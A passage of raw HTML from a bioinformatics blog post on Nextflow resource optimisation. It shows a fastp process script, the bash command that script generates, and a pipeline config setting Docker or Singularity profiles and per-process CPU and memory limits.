style="color:hsl(221, 87%, 60%)">&lt;&lt;-</span><span class="token plain">END_VERSIONS </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> versions.yml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${task.process}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        fastp: </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)">fastp </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token variable file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">sed</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"s/fastp //g"</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    END_VERSIONS</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<p>This generates the command to run fastp with 2 reads, where memory is allocated automatically.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash -ue</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain">  GM12878_REP2_1.fastq.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">ln</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-sf</span><span class="token plain"> SRX1603630_T1_1.fastq.gz GM12878_REP2_1.fastq.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain">  GM12878_REP2_2.fastq.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">ln</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-sf</span><span class="token plain"> SRX1603630_T1_2.fastq.gz GM12878_REP2_2.fastq.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">fastp </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--in1</span><span class="token plain"> GM12878_REP2_1.fastq.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--in2</span><span class="token plain"> GM12878_REP2_2.fastq.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--out1</span><span class="token plain"> GM12878_REP2_1.fastp.fastq.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--out2</span><span class="token plain"> GM12878_REP2_2.fastp.fastq.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--json</span><span class="token plain"> GM12878_REP2.fastp.json </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--html</span><span class="token plain"> GM12878_REP2.fastp.html </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">     </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">     </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">     </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--thread</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--detect_adapter_for_pe</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">     </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> GM12878_REP2.fastp.log </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;-</span><span class="token string" style="color:hsl(119, 34%, 47%)">END_VERSIONS</span><span class="token string bash punctuation" style="color:hsl(119, 34%, 47%)"> </span><span class="token string bash punctuation operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token string bash punctuation" style="color:hsl(119, 34%, 47%)"> versions.yml</span><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">"FASTP_1":</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">    fastp: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">fastp </span><span class="token string variable parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token string variable file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable function" style="color:hsl(221, 87%, 60%)">sed</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable string" style="color:hsl(119, 34%, 47%)">"s/fastp //g"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">END_VERSIONS</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="configuration">Configuration<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part1#configuration" class="hash-link" aria-label="Direct link to Configuration" title="Direct link to Configuration" translate="no">​</a></h2>
<p>This configuration allows the workflow to run with:</p>
<ul>
<li class="">Docker/Singularity for containerization</li>
<li class="">Tracing and reporting capabilities</li>
<li class="">Named processes for memory and CPU allocation</li>
</ul>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">params</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    outdir </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"result"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    trace_report_suffix </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> new java.util.Date</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">.format</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'yyyy-MM-dd_HH-mm-ss'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    input </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"inputs/full_samplsheet.csv"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">profiles </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    singularity </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        singularity.enabled     </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        singularity.autoMounts  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        conda.enabled           </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">false</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        docker.enabled          </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">false</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        podman.enabled          </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">false</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        shifter.enabled         </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">false</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        charliecloud.enabled    </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">false</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        apptainer.enabled       </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">false</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        docker.enabled          </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        conda.enabled           </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">false</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        singularity.enabled     </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">false</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        podman.enabled          </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">false</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        shifter.enabled         </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">false</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        charliecloud.enabled    </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">false</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        apptainer.enabled       </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">false</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        docker.runOptions       </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'-u $(id -u):$(id -g)'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    emulate_amd64 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        // Run AMD64 containers on ARM hardware using emulation </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">slower but </span><span class="token function" style="color:hsl(221, 87%, 60%)">more</span><span class="token plain"> compatible</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        docker.runOptions       </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'-u $(id -u):$(id -g) --platform=linux/amd64'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">singularity.registry </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'quay.io'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">docker.registry </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'quay.io'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withName:FASTQC_1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        cpus </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token plain">.GB</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withName:FASTQC_2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        cpus </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token plain">.GB</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withName:FASTQC_3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        cpus </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">16</span><span class="token plain"> .GB</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withName:FASTP_1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        cpus </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token plain">.GB</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withName:FASTP_2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        cpus </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token plain">.GB</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withName:FASTP_3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        cpus </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">16</span><span class="token plain"> .GB</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">timeline </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    enabled </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">file</span><span class="token plain">    </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${params.outdir}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/pipeline_info/execution_timeline_</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${params.trace_report_suffix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.html"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">report </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    enabled </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">file</span><span class="token plain">    </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${params.outdir}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/pipeline_info/execution_report_</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${params.trace_report_suffix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.html"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">trace </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    enabled </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">file</span><span class="token plain">    </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${params.outdir}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/pipeline_info/execution_trace_</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${params.trace_report_suffix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.txt"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="input-data">Input Data<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part1#input-data" class="hash-link" aria-label="Direct link to Input Data" title="Direct link to Input Data" translate="no">​</a></h2>
